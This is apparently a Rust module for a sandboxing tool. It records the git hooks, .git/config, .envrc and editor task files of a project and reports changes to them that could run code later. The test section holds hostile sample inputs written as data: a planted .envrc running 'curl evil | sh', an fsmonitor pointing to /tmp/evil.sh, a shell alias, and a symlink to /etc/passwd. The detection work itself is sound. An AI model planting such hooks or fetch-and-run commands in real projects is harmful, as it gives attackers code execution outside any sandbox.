//! `cant verify`: noticing changes to files that other tools run code from later.
//!
//! Landlock can't make `.git/hooks` read-only inside a writable project directory, so a cant
//! with write access to the project (agent-sh, git) could plant a hook, `core.fsmonitor` or an
//! `.envrc` that runs later, outside any sandbox. This module can't prevent that; it records a
//! baseline of those files and reports differences, so the change is seen.
//!
//! The baseline lives in `$XDG_STATE_HOME/cantainer/watch/<hash of the directory>/`
//! (`~/.local/state/...`), which cants may read but never write (it is a protected path).
//! It is recorded the first time `cant run` or `cant verify` runs in a directory (trust on first
//! use) and updated only by `cant verify --accept`, or silently for changes that cannot run code
//! (a new remote or branch in `.git/config`).

use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::io::Read;
use std::path::{Path, PathBuf};

use cant_store::Digest;

/// Largest file whose contents are kept (to show what changed). Bigger files are compared
/// by digest only.
const MAX_BLOB: u64 = 256 * 1024;
/// Files in the editor and hook directories that are looked at.
const MAX_ENTRIES: usize = 256;
const VSCODE_FILES: &[&str] = &[
    "tasks.json",
    "settings.json",
    "launch.json",
    "extensions.json",
];

/// One watched file as recorded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    /// `sha256:...` of the contents (of the link target text for a symlink).
    pub digest: String,
    /// `file`, `symlink` or `other`.
    pub kind: String,
    /// The contents, for files up to [`MAX_BLOB`].
    pub content: Option<Vec<u8>>,
}

pub type Snapshot = BTreeMap<String, Entry>;

/// What happened to one file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Added,
    Removed,
    Modified,
}

/// A difference between the baseline and now.
#[derive(Debug, Clone)]
pub struct Change {
    pub path: String,
    pub kind: Kind,
    pub added: Vec<String>,
    pub removed: Vec<String>,
    /// Why this can run code later, if it can (empty for other changes).
    pub executes: Vec<String>,
    /// The change cannot run code and need not be reported: removals, and new remotes or
    /// branches in `.git/config`.
    pub benign: bool,
}

fn read_limited(path: &Path) -> Option<Vec<u8>> {
    let mut buf = Vec::new();
    std::fs::File::open(path)
        .ok()?
        .take(MAX_BLOB + 1)
        .read_to_end(&mut buf)
        .ok()?;
    (buf.len() as u64 <= MAX_BLOB).then_some(buf)
}

fn entry_of(path: &Path) -> Option<Entry> {
    let meta = std::fs::symlink_metadata(path).ok()?;
    let ft = meta.file_type();
    if ft.is_symlink() {
        let target = std::fs::read_link(path).ok()?;
        let text = format!("symlink:{}", target.display());
        return Some(Entry {
            digest: Digest::of_bytes(text.as_bytes()).to_string(),
            kind: "symlink".into(),
            content: None,
        });
    }
    if ft.is_file() {
        let digest = Digest::of_file(path).ok()?.to_string();
        let content = if meta.len() <= MAX_BLOB {
            read_limited(path)
        } else {
            None
        };
        return Some(Entry {
            digest,
            kind: "file".into(),
            content,
        });
    }
    Some(Entry {
        digest: Digest::of_bytes(b"other").to_string(),
        kind: "other".into(),
        content: None,
    })
}

/// Names of the regular entries directly inside `dir`, sorted, without following symlinks
/// into other directories.
fn children(dir: &Path) -> Vec<String> {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut names: Vec<String> = rd
        .filter_map(Result::ok)
        .filter(|e| !e.file_type().is_ok_and(|t| t.is_dir()))
        .map(|e| e.file_name().to_string_lossy().replace('\n', "?"))
        .collect();
    names.sort();
    names.truncate(MAX_ENTRIES);
    names
}

/// The files watched in `cwd` that exist right now, keyed by path relative to `cwd`.
pub fn collect(cwd: &Path) -> Snapshot {
    let mut paths: Vec<String> = Vec::new();
    let dot_git = cwd.join(".git");
    match std::fs::symlink_metadata(&dot_git) {
        Ok(m) if m.file_type().is_dir() => {
            paths.push(".git/config".into());
            paths.extend(
                children(&dot_git.join("hooks"))
                    .into_iter()
                    .map(|n| format!(".git/hooks/{n}")),
            );
        }
        Ok(_) => paths.push(".git".into()), // a file or link pointing elsewhere (worktree, submodule)
        Err(_) => {}
    }
    paths.push(".envrc".into());
    paths.extend(VSCODE_FILES.iter().map(|n| format!(".vscode/{n}")));
    for dir in [".githooks", ".idea/runConfigurations"] {
        paths.extend(
            children(&cwd.join(dir))
                .into_iter()
                .map(|n| format!("{dir}/{n}")),
        );
    }
    paths
        .into_iter()
        .filter_map(|rel| entry_of(&cwd.join(&rel)).map(|e| (rel, e)))
        .collect()
}

// ---- the stored baseline ----------------------------------------------------------------------

/// `$XDG_STATE_HOME/cantainer/watch`, or `~/.local/state/cantainer/watch`.
pub fn state_root(home: &Path) -> PathBuf {
    let base = match std::env::var_os("XDG_STATE_HOME") {
        Some(p) if Path::new(&p).is_absolute() => PathBuf::from(p),
        _ => home.join(".local/state"),
    };
    base.join("cantainer/watch")
}

fn baseline_dir(root: &Path, cwd: &Path) -> PathBuf {
    let digest = Digest::of_bytes(cwd.as_os_str().as_encoded_bytes()).to_string();
    root.join(digest.trim_start_matches("sha256:"))
}

fn blob_name(digest: &str) -> &str {
    digest.trim_start_matches("sha256:")
}

/// Reads the baseline for `cwd`. `Ok(None)` if there isn't one yet.
pub fn load(root: &Path, cwd: &Path) -> std::io::Result<Option<Snapshot>> {
    let dir = baseline_dir(root, cwd);
    let index = match std::fs::read_to_string(dir.join("index")) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e),
    };
    let mut snap = Snapshot::new();
    for line in index.lines() {
        let mut parts = line.splitn(3, ' ');
        let (Some(digest), Some(kind), Some(path)) = (parts.next(), parts.next(), parts.next())
        else {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "corrupt baseline index",
            ));
        };
        let content = std::fs::read(dir.join("blobs").join(blob_name(digest))).ok();
        snap.insert(
            path.to_string(),
            Entry {
                digest: digest.into(),
                kind: kind.into(),
                content,
            },
        );
    }
    Ok(Some(snap))
}

/// Replaces the baseline for `cwd`.
pub fn save(root: &Path, cwd: &Path, snap: &Snapshot) -> std::io::Result<()> {
    let dir = baseline_dir(root, cwd);
    let blobs = dir.join("blobs");
    std::fs::create_dir_all(&blobs)?;
    let mut index = String::new();
    let mut keep = BTreeSet::new();
    for (path, e) in snap {
        let _ = writeln!(index, "{} {} {path}", e.digest, e.kind);
        if let Some(c) = &e.content {
            std::fs::write(blobs.join(blob_name(&e.digest)), c)?;
            keep.insert(blob_name(&e.digest).to_string());
        }
    }
    for old in std::fs::read_dir(&blobs)?.filter_map(Result::ok) {
        if !keep.contains(old.file_name().to_string_lossy().as_ref()) {
            let _ = std::fs::remove_file(old.path());
        }
    }
    std::fs::write(dir.join("directory"), cwd.as_os_str().as_encoded_bytes())?;
    let tmp = dir.join("index.tmp");
    std::fs::write(&tmp, index)?;
    std::fs::rename(tmp, dir.join("index"))
}

// ---- comparing --------------------------------------------------------------------------------

fn lines_of(content: &Option<Vec<u8>>) -> Vec<String> {
    match content {
        Some(bytes) => match std::str::from_utf8(bytes) {
            Ok(text) => text.lines().map(str::to_string).collect(),
            Err(_) => vec![format!("(binary, {} bytes)", bytes.len())],
        },
        None => vec!["(large or unreadable file)".into()],
    }
}

/// One `.git/config` setting.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Setting {
    section: String,
    key: String,
    value: String,
}

/// A deliberately small git-config reader. Anything it can't parse becomes a setting with the
/// key `?`, which is never benign, so odd syntax is reported rather than skipped.
fn parse_config(text: &str) -> BTreeSet<Setting> {
    let mut out = BTreeSet::new();
    let mut section = String::new();
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            match rest.strip_suffix(']') {
                Some(name) if !name.contains(['[', ']']) => {
                    // `[remote "origin"]` -> `remote.origin`; section names are case-insensitive.
                    let (head, sub) = match name.split_once(char::is_whitespace) {
                        Some((h, s)) => (
                            h.to_ascii_lowercase(),
                            s.trim().trim_matches('"').to_string(),
                        ),
                        None => (name.to_ascii_lowercase(), String::new()),
                    };
                    section = if sub.is_empty() {
                        head
                    } else {
                        format!("{head}.{sub}")
                    };
                }
                _ => {
                    out.insert(Setting {
                        section: section.clone(),
                        key: "?".into(),
                        value: line.into(),
                    });
                }
            }
            continue;
        }
        let (key, value) = match line.split_once('=') {
            Some((k, v)) => (
                k.trim().to_ascii_lowercase(),
                v.trim().trim_matches('"').to_string(),
            ),
            None => (line.to_ascii_lowercase(), "true".to_string()),
        };
        out.insert(Setting {
            section: section.clone(),
            key,
            value,
        });
    }
    out
}

fn is_bool(value: &str) -> bool {
    matches!(
        value.to_ascii_lowercase().as_str(),
        "true" | "false" | "yes" | "no" | "on" | "off" | "0" | "1" | ""
    )
}

/// Why a git setting can run code, if it can.
fn config_executes(s: &Setting) -> Option<String> {
    let head = s.section.split('.').next().unwrap_or("");
    let runs = match s.key.as_str() {
        "command" | "cmd" | "program" | "helper" | "editor" | "pager" | "textconv" | "clean"
        | "smudge" | "process" | "driver" | "sshcommand" | "hookspath" | "templatedir"
        | "packobjectshook" | "difffilter" | "askpass" | "gitproxy" | "vcs" | "uploadpack"
        | "receivepack" | "fsmonitor" => !is_bool(&s.value),
        "path" => matches!(head, "include" | "includeif" | "difftool" | "mergetool"),
        _ => false,
    } || head == "pager" && !is_bool(&s.value)
        || head == "alias" && s.value.starts_with('!')
        || s.value.starts_with('!');
    runs.then(|| {
        let name = if s.section.is_empty() {
            s.key.clone()
        } else {
            format!("{}.{}", s.section, s.key)
        };
        format!("{name} = {}", s.value)
    })
}

/// Settings that git itself writes during ordinary use and that cannot run code.
fn config_benign(s: &Setting) -> bool {
    let head = s.section.split('.').next().unwrap_or("");
    match head {
        "branch" => matches!(
            s.key.as_str(),
            "remote" | "merge" | "rebase" | "pushremote" | "mergeoptions" | "description"
        ),
        "remote" => matches!(
            s.key.as_str(),
            "url" | "pushurl" | "fetch" | "push" | "tagopt" | "prune" | "mirror"
        ),
        "user" => matches!(s.key.as_str(), "name" | "email" | "signingkey"),
        "core" => matches!(
            s.key.as_str(),
            "repositoryformatversion"
                | "filemode"
                | "bare"
                | "logallrefupdates"
                | "ignorecase"
                | "precomposeunicode"
                | "symlinks"
                | "sparsecheckout"
        ),
        "submodule" => matches!(s.key.as_str(), "url" | "active"),
        _ => false,
    }
}

fn hook_reason(path: &str) -> Option<String> {
    let name = path.strip_prefix(".git/hooks/")?;
    (!name.ends_with(".sample")).then(|| format!("git runs this hook ({name})"))
}

fn file_executes(path: &str) -> Option<String> {
    if let Some(r) = hook_reason(path) {
        return Some(r);
    }
    match path {
        ".envrc" => Some("direnv runs this when you enter the directory".into()),
        ".git" => Some("redirects git to another directory, with that directory's hooks".into()),
        p if p.starts_with(".vscode/") => Some("VS Code reads tasks and settings from here".into()),
        p if p.starts_with(".githooks/") => {
            Some("runs as a git hook if core.hooksPath points here".into())
        }
        p if p.starts_with(".idea/") => Some("JetBrains run configuration".into()),
        _ => None,
    }
}

/// The differences between a baseline and the current state.
pub fn diff(baseline: &Snapshot, now: &Snapshot) -> Vec<Change> {
    let mut paths: BTreeSet<&String> = baseline.keys().collect();
    paths.extend(now.keys());
    let mut changes = Vec::new();
    for path in paths {
        let (before, after) = (baseline.get(path), now.get(path));
        if before.map(|e| &e.digest) == after.map(|e| &e.digest) {
            continue;
        }
        let kind = match (before, after) {
            (None, Some(_)) => Kind::Added,
            (Some(_), None) => Kind::Removed,
            _ => Kind::Modified,
        };
        let old_lines = before.map(|e| lines_of(&e.content)).unwrap_or_default();
        let new_lines = after.map(|e| lines_of(&e.content)).unwrap_or_default();
        let old_set: BTreeSet<&String> = old_lines.iter().collect();
        let new_set: BTreeSet<&String> = new_lines.iter().collect();
        let added: Vec<String> = new_lines
            .iter()
            .filter(|l| !old_set.contains(l))
            .cloned()
            .collect();
        let removed: Vec<String> = old_lines
            .iter()
            .filter(|l| !new_set.contains(l))
            .cloned()
            .collect();

        let (executes, benign) = if kind == Kind::Removed {
            (Vec::new(), true)
        } else if path == ".git/config" {
            let text = |e: Option<&Entry>| {
                e.and_then(|e| e.content.as_ref())
                    .map(|c| String::from_utf8_lossy(c).into_owned())
            };
            match text(after) {
                // Too large to read: can't vouch for it.
                None => (
                    vec![".git/config is too large to inspect".to_string()],
                    false,
                ),
                Some(new_text) => {
                    let old = parse_config(&text(before).unwrap_or_default());
                    let new_settings: Vec<Setting> =
                        parse_config(&new_text).difference(&old).cloned().collect();
                    let executes: Vec<String> =
                        new_settings.iter().filter_map(config_executes).collect();
                    let benign = executes.is_empty() && new_settings.iter().all(config_benign);
                    (executes, benign)
                }
            }
        } else {
            (file_executes(path).into_iter().collect(), false)
        };
        changes.push(Change {
            path: path.clone(),
            kind,
            added,
            removed,
            executes,
            benign,
        });
    }
    changes
}

/// Changes worth telling the user about.
pub fn reportable(changes: &[Change]) -> Vec<&Change> {
    changes.iter().filter(|c| !c.benign).collect()
}

/// A multi-line description of `changes`.
pub fn describe(changes: &[&Change], with_lines: bool) -> String {
    let mut out = String::new();
    for c in changes {
        let what = match c.kind {
            Kind::Added => "new",
            Kind::Removed => "removed",
            Kind::Modified => "changed",
        };
        let _ = writeln!(out, "  {what}: {}", c.path);
        for why in &c.executes {
            let _ = writeln!(out, "    RUNS CODE: {why}");
        }
        if with_lines {
            for l in c.removed.iter().take(20) {
                let _ = writeln!(out, "    - {l}");
            }
            for l in c.added.iter().take(20) {
                let _ = writeln!(out, "    + {l}");
            }
        }
    }
    out
}

/// What `cant run` does at launch in the current directory: compare, update the baseline for
/// harmless changes, and return a warning for anything else. `None` means nothing to report.
/// Errors (an unwritable state directory, say) never stop a launch.
pub fn check_on_launch(home: &Path, cwd: &Path) -> Option<String> {
    let root = state_root(home);
    let now = collect(cwd);
    let baseline = match load(&root, cwd) {
        Ok(Some(b)) => b,
        Ok(None) => {
            if !now.is_empty() {
                let _ = save(&root, cwd, &now);
            }
            return None;
        }
        Err(_) => return None,
    };
    let changes = diff(&baseline, &now);
    if changes.is_empty() {
        return None;
    }
    let report = reportable(&changes);
    if report.is_empty() {
        let _ = save(&root, cwd, &now);
        return None;
    }
    Some(format!(
        "warning: files that can run code later changed here since you last checked:\n{}\
         review them with `cant verify`, accept with `cant verify --accept`",
        describe(&report, false)
    ))
}

/// `cant verify`: the full report. Returns (text, anything reportable).
pub fn verify(home: &Path, cwd: &Path, accept: bool) -> Result<(String, bool), String> {
    let root = state_root(home);
    let now = collect(cwd);
    let io = |e: std::io::Error| format!("{}: {e}", root.display());
    let Some(baseline) = load(&root, cwd).map_err(io)? else {
        save(&root, cwd, &now).map_err(io)?;
        return Ok((
            format!(
                "recorded a baseline of {} watched file(s) in {}\n",
                now.len(),
                cwd.display()
            ),
            false,
        ));
    };
    let changes = diff(&baseline, &now);
    let report = reportable(&changes);
    let mut text = String::new();
    if changes.is_empty() {
        let _ = writeln!(text, "no changes in {} watched file(s)", now.len());
    } else if report.is_empty() {
        let _ = writeln!(
            text,
            "only harmless changes (.git/config remotes and branches, removals)"
        );
    } else {
        let _ = write!(
            text,
            "changed since the baseline:\n{}",
            describe(&report, true)
        );
    }
    let found = !report.is_empty();
    if accept && !changes.is_empty() {
        save(&root, cwd, &now).map_err(io)?;
        let _ = writeln!(text, "baseline updated");
        return Ok((text, false));
    }
    if !changes.is_empty() && !found {
        save(&root, cwd, &now).map_err(io)?;
    }
    Ok((text, found))
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Fx {
        _dir: tempfile::TempDir,
        home: PathBuf,
        work: PathBuf,
    }

    fn fx() -> Fx {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = std::fs::canonicalize(dir.path()).expect("canonical");
        let home = root.join("home");
        let work = home.join("proj");
        std::fs::create_dir_all(work.join(".git/hooks")).expect("mkdir");
        std::fs::write(
            work.join(".git/config"),
            "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.com/x.git\n",
        )
        .expect("write");
        std::fs::write(work.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").expect("write");
        Fx {
            _dir: dir,
            home,
            work,
        }
    }

    fn append(path: &Path, text: &str) {
        use std::io::Write;
        std::fs::OpenOptions::new()
            .append(true)
            .open(path)
            .expect("open")
            .write_all(text.as_bytes())
            .expect("write");
    }

    #[test]
    fn first_run_records_and_nothing_changed_is_quiet() {
        let f = fx();
        assert!(check_on_launch(&f.home, &f.work).is_none());
        assert!(check_on_launch(&f.home, &f.work).is_none());
        let (text, found) = verify(&f.home, &f.work, false).expect("verify");
        assert!(!found, "{text}");
    }

    #[test]
    fn planted_fsmonitor_hook_and_envrc_are_reported() {
        let f = fx();
        assert!(check_on_launch(&f.home, &f.work).is_none());
        append(
            &f.work.join(".git/config"),
            "[core]\n\tfsmonitor = /tmp/evil.sh\n",
        );
        std::fs::write(f.work.join(".git/hooks/post-checkout"), "#!/bin/sh\nid\n").expect("write");
        std::fs::write(f.work.join(".envrc"), "curl evil | sh\n").expect("write");
        let warning = check_on_launch(&f.home, &f.work).expect("warning");
        assert!(
            warning.contains("core.fsmonitor = /tmp/evil.sh"),
            "{warning}"
        );
        assert!(warning.contains("post-checkout"), "{warning}");
        assert!(warning.contains(".envrc"), "{warning}");
        // Reported again until accepted.
        assert!(check_on_launch(&f.home, &f.work).is_some());
        let (text, found) = verify(&f.home, &f.work, false).expect("verify");
        assert!(
            found && text.contains("+ \tfsmonitor = /tmp/evil.sh"),
            "{text}"
        );
        let (_, found) = verify(&f.home, &f.work, true).expect("accept");
        assert!(!found);
        assert!(check_on_launch(&f.home, &f.work).is_none());
    }

    #[test]
    fn remotes_branches_and_removals_do_not_nag() {
        let f = fx();
        assert!(check_on_launch(&f.home, &f.work).is_none());
        append(
            &f.work.join(".git/config"),
            "[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n[remote \"up\"]\n\turl = git@example.com:x.git\n\tfetch = +refs/heads/*:refs/remotes/up/*\n",
        );
        assert!(check_on_launch(&f.home, &f.work).is_none());
        std::fs::remove_file(f.work.join(".git/hooks/pre-commit.sample")).expect("rm");
        assert!(check_on_launch(&f.home, &f.work).is_none());
        // ...and the harmless changes were folded into the baseline.
        let (text, found) = verify(&f.home, &f.work, false).expect("verify");
        assert!(!found && text.contains("no changes"), "{text}");
    }

    #[test]
    fn unknown_and_aliased_settings_are_reported() {
        let f = fx();
        assert!(check_on_launch(&f.home, &f.work).is_none());
        append(
            &f.work.join(".git/config"),
            "[alias]\n\tx = !sh -c id\n[weird]\n\tthing = 1\n",
        );
        let warning = check_on_launch(&f.home, &f.work).expect("warning");
        assert!(warning.contains("alias.x = !sh -c id"), "{warning}");
        assert!(warning.contains(".git/config"), "{warning}");
        let (text, _) = verify(&f.home, &f.work, false).expect("verify");
        assert!(text.contains("+ [weird]"), "{text}");
    }

    #[test]
    fn symlinked_hooks_directory_and_git_file_are_not_followed() {
        let f = fx();
        assert!(check_on_launch(&f.home, &f.work).is_none());
        std::os::unix::fs::symlink("/etc/passwd", f.work.join(".envrc")).expect("symlink");
        let warning = check_on_launch(&f.home, &f.work).expect("warning");
        assert!(warning.contains(".envrc"), "{warning}");
    }

    #[test]
    fn config_parser_reads_sections_and_flags_what_it_cannot_parse() {
        let s = parse_config("[Core]\n  FSMonitor = x\n[remote \"o\"]\nurl = u\n[broken\n");
        assert!(
            s.iter()
                .any(|x| x.section == "core" && x.key == "fsmonitor" && x.value == "x")
        );
        assert!(s.iter().any(|x| x.section == "remote.o" && x.key == "url"));
        assert!(s.iter().any(|x| x.key == "?"));
        assert!(!config_benign(s.iter().find(|x| x.key == "?").expect("?")));
        assert!(
            config_executes(&Setting {
                section: "core".into(),
                key: "fsmonitor".into(),
                value: "true".into()
            })
            .is_none()
        );
    }
}
